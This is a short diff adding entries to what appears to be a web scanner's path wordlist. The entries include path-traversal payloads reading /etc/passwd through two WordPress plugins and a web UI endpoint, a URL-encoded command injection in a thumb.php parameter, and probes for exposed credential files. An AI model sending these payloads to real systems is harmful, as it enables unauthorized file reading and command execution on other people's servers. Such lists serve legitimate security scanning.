@@ -1,0 +1,8 @@
+/current_config/Sha1Account1
+/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152
+/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd
+/password.jsn
+/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
+/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
+/service/v1/service-details
+/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
